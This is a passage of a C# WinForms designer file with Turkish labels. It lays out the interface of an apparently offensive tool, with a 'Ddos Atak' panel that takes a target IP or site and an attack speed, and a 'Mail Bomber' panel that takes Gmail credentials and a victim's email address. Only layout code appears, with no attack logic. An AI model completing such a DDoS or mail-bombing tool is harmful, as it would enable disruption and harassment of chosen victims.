            this.recuperareIIButton21.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton21.Location = new System.Drawing.Point(653, 117);
            this.recuperareIIButton21.Name = "recuperareIIButton21";
            this.recuperareIIButton21.Size = new System.Drawing.Size(124, 24);
            this.recuperareIIButton21.TabIndex = 26;
            this.recuperareIIButton21.Text = "MAVİ";
            this.recuperareIIButton21.Click += new System.EventHandler(this.RecuperareIIButton21_Click);
            // 
            // pictureBox15
            // 
            this.pictureBox15.BackColor = System.Drawing.Color.Black;
            this.pictureBox15.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox15.Image")));
            this.pictureBox15.Location = new System.Drawing.Point(705, 247);
            this.pictureBox15.Name = "pictureBox15";
            this.pictureBox15.Size = new System.Drawing.Size(72, 57);
            this.pictureBox15.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox15.TabIndex = 1;
            this.pictureBox15.TabStop = false;
            this.pictureBox15.Click += new System.EventHandler(this.PictureBox15_Click);
            // 
            // listBox6
            // 
            this.listBox6.BackColor = System.Drawing.Color.Black;
            this.listBox6.ForeColor = System.Drawing.Color.Yellow;
            this.listBox6.FormattingEnabled = true;
            this.listBox6.Location = new System.Drawing.Point(11, 29);
            this.listBox6.Name = "listBox6";
            this.listBox6.Size = new System.Drawing.Size(798, 290);
            this.listBox6.TabIndex = 0;
            // 
            // iTalk_GroupBox1
            // 
            this.iTalk_GroupBox1.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_GroupBox1.Controls.Add(this.monoFlat_Button6);
            this.iTalk_GroupBox1.Controls.Add(this.monoFlat_Button5);
            this.iTalk_GroupBox1.Controls.Add(this.monoFlat_Button4);
            this.iTalk_GroupBox1.Controls.Add(this.hours);
            this.iTalk_GroupBox1.Controls.Add(this.atak);
            this.iTalk_GroupBox1.Controls.Add(this.label31);
            this.iTalk_GroupBox1.Controls.Add(this.label30);
            this.iTalk_GroupBox1.Location = new System.Drawing.Point(16, 47);
            this.iTalk_GroupBox1.MinimumSize = new System.Drawing.Size(136, 50);
            this.iTalk_GroupBox1.Name = "iTalk_GroupBox1";
            this.iTalk_GroupBox1.Padding = new System.Windows.Forms.Padding(5, 28, 5, 5);
            this.iTalk_GroupBox1.Size = new System.Drawing.Size(820, 129);
            this.iTalk_GroupBox1.TabIndex = 8;
            this.iTalk_GroupBox1.Text = "Ddos Bilgiler";
            // 
            // monoFlat_Button6
            // 
            this.monoFlat_Button6.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button6.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button6.Image = null;
            this.monoFlat_Button6.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button6.Location = new System.Drawing.Point(552, 86);
            this.monoFlat_Button6.Name = "monoFlat_Button6";
            this.monoFlat_Button6.Size = new System.Drawing.Size(146, 28);
            this.monoFlat_Button6.TabIndex = 15;
            this.monoFlat_Button6.Text = "TEMİZLE";
            this.monoFlat_Button6.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button6.Click += new System.EventHandler(this.MonoFlat_Button6_Click);
            // 
            // monoFlat_Button5
            // 
            this.monoFlat_Button5.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button5.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button5.Image = null;
            this.monoFlat_Button5.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button5.Location = new System.Drawing.Point(400, 86);
            this.monoFlat_Button5.Name = "monoFlat_Button5";
            this.monoFlat_Button5.Size = new System.Drawing.Size(146, 28);
            this.monoFlat_Button5.TabIndex = 14;
            this.monoFlat_Button5.Text = "DURDUR";
            this.monoFlat_Button5.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button5.Click += new System.EventHandler(this.MonoFlat_Button5_Click);
            // 
            // monoFlat_Button4
            // 
            this.monoFlat_Button4.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button4.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button4.Image = null;
            this.monoFlat_Button4.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button4.Location = new System.Drawing.Point(248, 86);
            this.monoFlat_Button4.Name = "monoFlat_Button4";
            this.monoFlat_Button4.Size = new System.Drawing.Size(146, 28);
            this.monoFlat_Button4.TabIndex = 9;
            this.monoFlat_Button4.Text = "BAŞLAT";
            this.monoFlat_Button4.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button4.Click += new System.EventHandler(this.MonoFlat_Button4_Click);
            // 
            // hours
            // 
            this.hours.BackColor = System.Drawing.Color.Transparent;
            this.hours.Font = new System.Drawing.Font("Tahoma", 11F);
            this.hours.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(76)))), ((int)(((byte)(76)))), ((int)(((byte)(76)))));
            this.hours.Location = new System.Drawing.Point(141, 86);
            this.hours.Maximum = ((long)(100));
            this.hours.Minimum = ((long)(0));
            this.hours.MinimumSize = new System.Drawing.Size(62, 28);
            this.hours.Name = "hours";
            this.hours.Size = new System.Drawing.Size(93, 28);
            this.hours.TabIndex = 13;
            this.hours.Text = "ambiance_NumericUpDown1";
            this.hours.TextAlignment = Ambiance.Ambiance_NumericUpDown._TextAlignment.Near;
            this.hours.Value = ((long)(0));
            // 
            // atak
            // 
            this.atak.BackColor = System.Drawing.Color.Transparent;
            this.atak.Font = new System.Drawing.Font("Tahoma", 11F);
            this.atak.ForeColor = System.Drawing.Color.DimGray;
            this.atak.Location = new System.Drawing.Point(141, 35);
            this.atak.MaxLength = 32767;
            this.atak.Multiline = false;
            this.atak.Name = "atak";
            this.atak.ReadOnly = false;
            this.atak.Size = new System.Drawing.Size(652, 28);
            this.atak.TabIndex = 11;
            this.atak.Text = "IP & SİTE ADRESİ";
            this.atak.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.atak.UseSystemPasswordChar = false;
            // 
            // label31
            // 
            this.label31.AutoSize = true;
            this.label31.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label31.Location = new System.Drawing.Point(50, 94);
            this.label31.Name = "label31";
            this.label31.Size = new System.Drawing.Size(91, 13);
            this.label31.TabIndex = 10;
            this.label31.Text = "Saldırı Hızı :";
            // 
            // label30
            // 
            this.label30.AutoSize = true;
            this.label30.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label30.Location = new System.Drawing.Point(8, 41);
            this.label30.Name = "label30";
            this.label30.Size = new System.Drawing.Size(133, 13);
            this.label30.TabIndex = 9;
            this.label30.Text = "Ip Veya Site Adresi :";
            // 
            // panel30
            // 
            this.panel30.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel30.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.panel30.Location = new System.Drawing.Point(10, 60);
            this.panel30.Name = "panel30";
            this.panel30.Size = new System.Drawing.Size(63, 10);
            this.panel30.TabIndex = 7;
            // 
            // panel29
            // 
            this.panel29.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel29.Dock = System.Windows.Forms.DockStyle.Right;
            this.panel29.Location = new System.Drawing.Point(73, 36);
            this.panel29.Name = "panel29";
            this.panel29.Size = new System.Drawing.Size(10, 34);
            this.panel29.TabIndex = 6;
            // 
            // panel28
            // 
            this.panel28.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel28.Dock = System.Windows.Forms.DockStyle.Left;
            this.panel28.Location = new System.Drawing.Point(0, 36);
            this.panel28.Name = "panel28";
            this.panel28.Size = new System.Drawing.Size(10, 34);
            this.panel28.TabIndex = 5;
            // 
            // panel27
            // 
            this.panel27.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel27.Controls.Add(this.label27);
            this.panel27.Controls.Add(this.button6);
            this.panel27.Dock = System.Windows.Forms.DockStyle.Top;
            this.panel27.Location = new System.Drawing.Point(0, 0);
            this.panel27.Name = "panel27";
            this.panel27.Size = new System.Drawing.Size(83, 36);
            this.panel27.TabIndex = 3;
            this.panel27.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Panel27_MouseDown);
            this.panel27.MouseMove += new System.Windows.Forms.MouseEventHandler(this.Panel27_MouseMove);
            this.panel27.MouseUp += new System.Windows.Forms.MouseEventHandler(this.Panel27_MouseUp);
            // 
            // label27
            // 
            this.label27.AutoSize = true;
            this.label27.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label27.ForeColor = System.Drawing.Color.White;
            this.label27.Location = new System.Drawing.Point(383, 10);
            this.label27.Name = "label27";
            this.label27.Size = new System.Drawing.Size(98, 17);
            this.label27.TabIndex = 12;
            this.label27.Text = "< Ddos Atak >";
            // 
            // button6
            // 
            this.button6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button6.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button6.ForeColor = System.Drawing.Color.White;
            this.button6.Location = new System.Drawing.Point(821, 8);
            this.button6.Name = "button6";
            this.button6.Size = new System.Drawing.Size(23, 22);
            this.button6.TabIndex = 4;
            this.button6.Text = "X";
            this.button6.UseVisualStyleBackColor = false;
            this.button6.Click += new System.EventHandler(this.Button6_Click);
            // 
            // timer4
            // 
            this.timer4.Interval = 2000;
            this.timer4.Tick += new System.EventHandler(this.Timer4_Tick);
            // 
            // timer5
            // 
            this.timer5.Tick += new System.EventHandler(this.Timer5_Tick);
            // 
            // panel31
            // 
            this.panel31.BackColor = System.Drawing.Color.White;
            this.panel31.Controls.Add(this.iTalk_GroupBox9);
            this.panel31.Controls.Add(this.iTalk_GroupBox8);
            this.panel31.Controls.Add(this.iTalk_GroupBox7);
            this.panel31.Controls.Add(this.iTalk_GroupBox3);
            this.panel31.Controls.Add(this.panel35);
            this.panel31.Controls.Add(this.panel34);
            this.panel31.Controls.Add(this.panel33);
            this.panel31.Controls.Add(this.panel32);
            this.panel31.Location = new System.Drawing.Point(326, 331);
            this.panel31.Name = "panel31";
            this.panel31.Size = new System.Drawing.Size(65, 62);
            this.panel31.TabIndex = 25;
            this.panel31.Paint += new System.Windows.Forms.PaintEventHandler(this.Panel31_Paint);
            // 
            // iTalk_GroupBox9
            // 
            this.iTalk_GroupBox9.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_GroupBox9.Controls.Add(this.textBox2);
            this.iTalk_GroupBox9.Controls.Add(this.textBox3);
            this.iTalk_GroupBox9.Controls.Add(this.label49);
            this.iTalk_GroupBox9.Controls.Add(this.label50);
            this.iTalk_GroupBox9.Location = new System.Drawing.Point(382, 42);
            this.iTalk_GroupBox9.MinimumSize = new System.Drawing.Size(136, 50);
            this.iTalk_GroupBox9.Name = "iTalk_GroupBox9";
            this.iTalk_GroupBox9.Padding = new System.Windows.Forms.Padding(5, 28, 5, 5);
            this.iTalk_GroupBox9.Size = new System.Drawing.Size(308, 433);
            this.iTalk_GroupBox9.TabIndex = 12;
            this.iTalk_GroupBox9.Text = "Mesaj Bölümü";
            // 
            // textBox2
            // 
            this.textBox2.BackColor = System.Drawing.Color.Transparent;
            this.textBox2.Font = new System.Drawing.Font("Tahoma", 11F);
            this.textBox2.ForeColor = System.Drawing.Color.DimGray;
            this.textBox2.Location = new System.Drawing.Point(9, 43);
            this.textBox2.MaxLength = 32767;
            this.textBox2.Multiline = false;
            this.textBox2.Name = "textBox2";
            this.textBox2.ReadOnly = false;
            this.textBox2.Size = new System.Drawing.Size(289, 28);
            this.textBox2.TabIndex = 17;
            this.textBox2.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.textBox2.UseSystemPasswordChar = false;
            this.textBox2.TextChanged += new System.EventHandler(this.Ambiance_TextBox2_TextChanged_1);
            // 
            // textBox3
            // 
            this.textBox3.Location = new System.Drawing.Point(9, 93);
            this.textBox3.Multiline = true;
            this.textBox3.Name = "textBox3";
            this.textBox3.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.textBox3.Size = new System.Drawing.Size(291, 320);
            this.textBox3.TabIndex = 16;
            this.textBox3.TextChanged += new System.EventHandler(this.TextBox3_TextChanged);
            // 
            // label49
            // 
            this.label49.AutoSize = true;
            this.label49.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label49.Location = new System.Drawing.Point(8, 75);
            this.label49.Name = "label49";
            this.label49.Size = new System.Drawing.Size(61, 13);
            this.label49.TabIndex = 14;
            this.label49.Text = "Mesajınız";
            // 
            // label50
            // 
            this.label50.AutoSize = true;
            this.label50.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label50.Location = new System.Drawing.Point(83, 28);
            this.label50.Name = "label50";
            this.label50.Size = new System.Drawing.Size(79, 13);
            this.label50.TabIndex = 7;
            this.label50.Text = "Mesaj Başlık";
            // 
            // iTalk_GroupBox8
            // 
            this.iTalk_GroupBox8.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_GroupBox8.Controls.Add(this.saldırıd);
            this.iTalk_GroupBox8.Controls.Add(this.KURBAN);
            this.iTalk_GroupBox8.Controls.Add(this.saldırı);
            this.iTalk_GroupBox8.Controls.Add(this.up);
            this.iTalk_GroupBox8.Controls.Add(this.label43);
            this.iTalk_GroupBox8.Location = new System.Drawing.Point(15, 320);
            this.iTalk_GroupBox8.MinimumSize = new System.Drawing.Size(136, 50);
            this.iTalk_GroupBox8.Name = "iTalk_GroupBox8";
            this.iTalk_GroupBox8.Padding = new System.Windows.Forms.Padding(5, 28, 5, 5);
            this.iTalk_GroupBox8.Size = new System.Drawing.Size(361, 155);
            this.iTalk_GroupBox8.TabIndex = 11;
            this.iTalk_GroupBox8.Text = "Kurban Ayarları";
            // 
            // saldırıd
            // 
            this.saldırıd.BackColor = System.Drawing.Color.Transparent;
            this.saldırıd.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.saldırıd.Image = null;
            this.saldırıd.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.saldırıd.Location = new System.Drawing.Point(181, 101);
            this.saldırıd.Name = "saldırıd";
            this.saldırıd.Size = new System.Drawing.Size(146, 41);
            this.saldırıd.TabIndex = 15;
            this.saldırıd.Text = "DURDUR";
            this.saldırıd.TextAlignment = System.Drawing.StringAlignment.Center;
            this.saldırıd.Click += new System.EventHandler(this.Saldırıd_Click);
            // 
            // KURBAN
            // 
            this.KURBAN.BackColor = System.Drawing.Color.Transparent;
            this.KURBAN.Font = new System.Drawing.Font("Tahoma", 11F);
            this.KURBAN.ForeColor = System.Drawing.Color.DimGray;
            this.KURBAN.Location = new System.Drawing.Point(99, 60);
            this.KURBAN.MaxLength = 32767;
            this.KURBAN.Multiline = false;
            this.KURBAN.Name = "KURBAN";
            this.KURBAN.ReadOnly = false;
            this.KURBAN.Size = new System.Drawing.Size(228, 28);
            this.KURBAN.TabIndex = 13;
            this.KURBAN.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.KURBAN.UseSystemPasswordChar = false;
            // 
            // saldırı
            // 
            this.saldırı.BackColor = System.Drawing.Color.Transparent;
            this.saldırı.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.saldırı.Image = null;
            this.saldırı.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.saldırı.Location = new System.Drawing.Point(20, 101);
            this.saldırı.Name = "saldırı";
            this.saldırı.Size = new System.Drawing.Size(146, 41);
            this.saldırı.TabIndex = 14;
            this.saldırı.Text = "BAŞLAT";
            this.saldırı.TextAlignment = System.Drawing.StringAlignment.Center;
            this.saldırı.Click += new System.EventHandler(this.Saldırı_Click);
            // 
            // up
            // 
            this.up.Location = new System.Drawing.Point(201, 34);
            this.up.Maximum = new decimal(new int[] {
            1,
            0,
            0,
            0});
            this.up.Minimum = new decimal(new int[] {
            1,
            0,
            0,
            0});
            this.up.Name = "up";
            this.up.Size = new System.Drawing.Size(120, 20);
            this.up.TabIndex = 17;
            this.up.Value = new decimal(new int[] {
            1,
            0,
            0,
            0});
            // 
            // label43
            // 
            this.label43.AutoSize = true;
            this.label43.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label43.Location = new System.Drawing.Point(11, 67);
            this.label43.Name = "label43";
            this.label43.Size = new System.Drawing.Size(91, 13);
            this.label43.TabIndex = 12;
            this.label43.Text = "Kurban Email :";
            // 
            // iTalk_GroupBox7
            // 
            this.iTalk_GroupBox7.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_GroupBox7.Controls.Add(this.TXT4);
            this.iTalk_GroupBox7.Controls.Add(this.gizle);
            this.iTalk_GroupBox7.Controls.Add(this.label41);
            this.iTalk_GroupBox7.Controls.Add(this.TXT3);
            this.iTalk_GroupBox7.Controls.Add(this.label42);
            this.iTalk_GroupBox7.Location = new System.Drawing.Point(15, 202);
            this.iTalk_GroupBox7.MinimumSize = new System.Drawing.Size(136, 50);
            this.iTalk_GroupBox7.Name = "iTalk_GroupBox7";
            this.iTalk_GroupBox7.Padding = new System.Windows.Forms.Padding(5, 28, 5, 5);
            this.iTalk_GroupBox7.Size = new System.Drawing.Size(361, 107);
            this.iTalk_GroupBox7.TabIndex = 10;
            this.iTalk_GroupBox7.Text = "G-mail Giriş Ayarları";
            // 
            // TXT4
            // 
            this.TXT4.BackColor = System.Drawing.Color.Transparent;
            this.TXT4.Font = new System.Drawing.Font("Tahoma", 11F);
            this.TXT4.ForeColor = System.Drawing.Color.DimGray;
            this.TXT4.Location = new System.Drawing.Point(73, 66);
            this.TXT4.MaxLength = 32767;
            this.TXT4.Multiline = false;
            this.TXT4.Name = "TXT4";
            this.TXT4.ReadOnly = false;
            this.TXT4.Size = new System.Drawing.Size(156, 28);
            this.TXT4.TabIndex = 11;
            this.TXT4.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.TXT4.UseSystemPasswordChar = false;
            // 
            // gizle
            // 
            this.gizle.AutoSize = true;
            this.gizle.Location = new System.Drawing.Point(236, 72);
            this.gizle.Name = "gizle";
            this.gizle.Size = new System.Drawing.Size(85, 17);
            this.gizle.TabIndex = 12;
            this.gizle.Text = "Gizle/Göster";
            this.gizle.UseVisualStyleBackColor = true;
            // 
            // label41
            // 
            this.label41.AutoSize = true;
            this.label41.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label41.Location = new System.Drawing.Point(23, 74);
            this.label41.Name = "label41";
            this.label41.Size = new System.Drawing.Size(49, 13);
            this.label41.TabIndex = 8;
            this.label41.Text = "Şifre :";
            // 
            // TXT3
            // 
            this.TXT3.BackColor = System.Drawing.Color.Transparent;
            this.TXT3.Font = new System.Drawing.Font("Tahoma", 11F);
            this.TXT3.ForeColor = System.Drawing.Color.DimGray;
            this.TXT3.Location = new System.Drawing.Point(73, 32);
            this.TXT3.MaxLength = 32767;
            this.TXT3.Multiline = false;
            this.TXT3.Name = "TXT3";
            this.TXT3.ReadOnly = false;
            this.TXT3.Size = new System.Drawing.Size(254, 28);
            this.TXT3.TabIndex = 6;
            this.TXT3.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.TXT3.UseSystemPasswordChar = false;
            this.TXT3.TextChanged += new System.EventHandler(this.Ambiance_TextBox2_TextChanged);
            // 
            // label42
            // 
            this.label42.AutoSize = true;
            this.label42.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label42.Location = new System.Drawing.Point(17, 38);
            this.label42.Name = "label42";
            this.label42.Size = new System.Drawing.Size(55, 13);
            this.label42.TabIndex = 7;
            this.label42.Text = "E-mail :";
            // 
            // iTalk_GroupBox3
            // 
            this.iTalk_GroupBox3.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_GroupBox3.Controls.Add(this.com3);
            this.iTalk_GroupBox3.Controls.Add(this.com1);
            this.iTalk_GroupBox3.Controls.Add(this.com2);
            this.iTalk_GroupBox3.Controls.Add(this.label29);
            this.iTalk_GroupBox3.Controls.Add(this.label38);
            this.iTalk_GroupBox3.Controls.Add(this.label39);
            this.iTalk_GroupBox3.Controls.Add(this.label40);
            this.iTalk_GroupBox3.Location = new System.Drawing.Point(16, 42);
            this.iTalk_GroupBox3.MinimumSize = new System.Drawing.Size(136, 50);
            this.iTalk_GroupBox3.Name = "iTalk_GroupBox3";
            this.iTalk_GroupBox3.Padding = new System.Windows.Forms.Padding(5, 28, 5, 5);
            this.iTalk_GroupBox3.Size = new System.Drawing.Size(361, 152);
            this.iTalk_GroupBox3.TabIndex = 9;
            this.iTalk_GroupBox3.Text = "MAİL AYARLARI";
            // 
            // com3
            // 
            this.com3.BackColor = System.Drawing.Color.Transparent;
            this.com3.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.com3.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.com3.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.com3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.com3.FormattingEnabled = true;
            this.com3.ItemHeight = 16;
            this.com3.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(121)))), ((int)(((byte)(176)))), ((int)(((byte)(214)))));
            this.com3.Items.AddRange(new object[] {
            "true",
            "false"});
            this.com3.Location = new System.Drawing.Point(93, 111);
            this.com3.Name = "com3";
            this.com3.Size = new System.Drawing.Size(91, 22);
            this.com3.StartIndex = 0;
            this.com3.TabIndex = 16;
            // 
            // com1
            // 
            this.com1.BackColor = System.Drawing.Color.Transparent;
            this.com1.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.com1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.com1.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.com1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.com1.FormattingEnabled = true;
            this.com1.ItemHeight = 16;
            this.com1.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(121)))), ((int)(((byte)(176)))), ((int)(((byte)(214)))));
            this.com1.Items.AddRange(new object[] {
            "587"});
            this.com1.Location = new System.Drawing.Point(57, 78);
            this.com1.Name = "com1";
            this.com1.Size = new System.Drawing.Size(278, 22);
            this.com1.StartIndex = 0;
            this.com1.TabIndex = 15;
            // 
            // com2
            // 
            this.com2.BackColor = System.Drawing.Color.Transparent;
            this.com2.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.com2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.com2.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.com2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.com2.FormattingEnabled = true;
            this.com2.ItemHeight = 16;
            this.com2.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(121)))), ((int)(((byte)(176)))), ((int)(((byte)(214)))));
            this.com2.Items.AddRange(new object[] {
            "smtp.gmail.com"});
            this.com2.Location = new System.Drawing.Point(57, 41);
            this.com2.Name = "com2";
            this.com2.Size = new System.Drawing.Size(278, 22);
            this.com2.StartIndex = 0;
            this.com2.TabIndex = 14;
            // 
            // label29
            // 
            this.label29.AutoSize = true;
            this.label29.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label29.Location = new System.Drawing.Point(190, 115);
            this.label29.Name = "label29";
            this.label29.Size = new System.Drawing.Size(145, 13);
            this.label29.TabIndex = 13;
            this.label29.Text = "Aktif Pasif true Olucak";
            // 
            // label38
            // 
            this.label38.AutoSize = true;
            this.label38.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label38.Location = new System.Drawing.Point(8, 115);
            this.label38.Name = "label38";
            this.label38.Size = new System.Drawing.Size(85, 13);
            this.label38.TabIndex = 9;
            this.label38.Text = "Aktif/Pasif :";
            // 
            // label39
            // 
            this.label39.AutoSize = true;
            this.label39.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label39.Location = new System.Drawing.Point(8, 81);
            this.label39.Name = "label39";
            this.label39.Size = new System.Drawing.Size(43, 13);
            this.label39.TabIndex = 8;
            this.label39.Text = "PORT :";
            // 
            // label40
            // 
            this.label40.AutoSize = true;
            this.label40.Font = new System.Drawing.Font("Consolas", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label40.Location = new System.Drawing.Point(8, 44);
            this.label40.Name = "label40";
            this.label40.Size = new System.Drawing.Size(43, 13);
            this.label40.TabIndex = 7;
            this.label40.Text = "SMTP :";
            // 
            // panel35
            // 
            this.panel35.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel35.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.panel35.Location = new System.Drawing.Point(6, 56);
            this.panel35.Name = "panel35";
            this.panel35.Size = new System.Drawing.Size(53, 6);
            this.panel35.TabIndex = 8;
            // 
            // panel34
            // 
            this.panel34.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel34.Dock = System.Windows.Forms.DockStyle.Right;
            this.panel34.Location = new System.Drawing.Point(59, 36);
            this.panel34.Name = "panel34";
            this.panel34.Size = new System.Drawing.Size(6, 26);
            this.panel34.TabIndex = 7;
            // 
            // panel33
            // 
            this.panel33.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel33.Dock = System.Windows.Forms.DockStyle.Left;
            this.panel33.Location = new System.Drawing.Point(0, 36);
            this.panel33.Name = "panel33";
            this.panel33.Size = new System.Drawing.Size(6, 26);
            this.panel33.TabIndex = 6;
            // 
            // panel32
            // 
            this.panel32.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel32.Controls.Add(this.label28);
            this.panel32.Controls.Add(this.button7);
            this.panel32.Dock = System.Windows.Forms.DockStyle.Top;
            this.panel32.Location = new System.Drawing.Point(0, 0);
            this.panel32.Name = "panel32";
            this.panel32.Size = new System.Drawing.Size(65, 36);
            this.panel32.TabIndex = 4;
            this.panel32.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Panel32_MouseDown);
            this.panel32.MouseMove += new System.Windows.Forms.MouseEventHandler(this.Panel32_MouseMove);
            this.panel32.MouseUp += new System.Windows.Forms.MouseEventHandler(this.Panel32_MouseUp);
            // 
            // label28
            // 
            this.label28.AutoSize = true;
            this.label28.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label28.ForeColor = System.Drawing.Color.White;
            this.label28.Location = new System.Drawing.Point(299, 10);
            this.label28.Name = "label28";
            this.label28.Size = new System.Drawing.Size(113, 17);
            this.label28.TabIndex = 12;
            this.label28.Text = "< Mail Bomber >";
            // 
            // button7
            // 
            this.button7.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button7.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button7.ForeColor = System.Drawing.Color.White;
            this.button7.Location = new System.Drawing.Point(673, 7);
            this.button7.Name = "button7";
            this.button7.Size = new System.Drawing.Size(23, 22);
            this.button7.TabIndex = 4;
            this.button7.Text = "X";
            this.button7.UseVisualStyleBackColor = false;
            this.button7.Click += new System.EventHandler(this.Button7_Click);
            // 
            // timer8
            // 
            this.timer8.Tick += new System.EventHandler(this.Timer8_Tick);
            // 
            // panel36
            // 
            this.panel36.BackColor = System.Drawing.Color.White;
            this.panel36.Controls.Add(this.monoFlat_Button9);
            this.panel36.Controls.Add(this.monoFlat_Button8);
            this.panel36.Controls.Add(this.monoFlat_Button7);
            this.panel36.Controls.Add(this.iTalk_GroupBox10);
            this.panel36.Controls.Add(this.iTalk_GroupBox6);
            this.panel36.Controls.Add(this.panel40);
            this.panel36.Controls.Add(this.panel39);
            this.panel36.Controls.Add(this.panel38);
            this.panel36.Controls.Add(this.panel37);
            this.panel36.Location = new System.Drawing.Point(719, 229);
            this.panel36.Name = "panel36";
            this.panel36.Size = new System.Drawing.Size(78, 69);
            this.panel36.TabIndex = 26;
            // 
            // monoFlat_Button9
            // 
            this.monoFlat_Button9.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button9.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button9.Image = null;
            this.monoFlat_Button9.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button9.Location = new System.Drawing.Point(740, 541);
